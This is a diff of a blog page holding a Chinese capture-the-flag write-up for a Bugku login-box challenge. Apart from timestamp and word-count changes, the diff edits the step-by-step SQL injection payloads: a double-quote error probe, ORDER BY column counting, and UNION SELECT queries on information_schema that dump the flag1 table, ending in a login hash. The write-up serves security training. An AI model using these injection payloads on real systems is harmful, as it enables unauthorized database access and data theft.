@@ -125,7 +125,7 @@
 <meta property="og:image" content="https://i.imgur.com/x9z5SYO.png">
 <meta property="og:image" content="https://i.imgur.com/dIPRsuy.png">
 <meta property="og:image" content="https://i.imgur.com/evQXsji.png">
-<meta property="og:updated_time" content="2018-08-09T10:01:46.434Z">
+<meta property="og:updated_time" content="2018-08-09T11:48:03.625Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WP-Bugku-这是一个神奇的登陆框">
 <meta name="twitter:description" content="题目地址：http://120.24.86.145:9001/sql/ 寻找注入点，找到1&amp;quot;双引号会报错 order by判断字段数：1&amp;quot;order by 1,2,3-- 找表：1&amp;quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=dat">
@@ -381,7 +381,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-09T18:01:46+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-09T19:48:03+08:00">
                 2018-08-09
               </time>
             
@@ -414,7 +414,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  90 字
+                  91 字
                 </span>
               
 
@@ -454,10 +454,10 @@
         <p>题目地址：<a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p>
 <p>寻找注入点，找到<code>1&quot;</code>双引号会报错<br><img src="https://i.imgur.com/x9z5SYO.png" alt=""></p>
 <p>order by判断字段数：<br><code>1&quot;order by 1,2,3--</code></p>
-<p>找表：<br><code>1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#</code><br><img src="https://i.imgur.com/dIPRsuy.png" alt=""><br>根据提示，得到表flag1，whoami</p>
-<p>继续找列<br><code>1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;#</code><br><img src="https://i.imgur.com/evQXsji.png" alt=""></p>
-<p>找字段<br><code>1&quot; union select flag1,2 from flag1</code></p>
-<p>得到flag</p>
+<p>找表：<br><code>1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--</code><br><img src="https://i.imgur.com/dIPRsuy.png" alt=""><br>根据提示，得到表flag1，whoami</p>
+<p>继续找列<br><code>1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;--</code><br><img src="https://i.imgur.com/evQXsji.png" alt=""></p>
+<p>找字段<br><code>1&quot; union select flag1,2 from flag1--</code></p>
+<p>得到Login_Name:ed6b28e684817d9efcaf802979e57aea</p>
 
       
     </div>
@@ -775,7 +775,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">14.7k</span>
+    <span title="Site words total count">14.8k</span>
   
 </div>
 
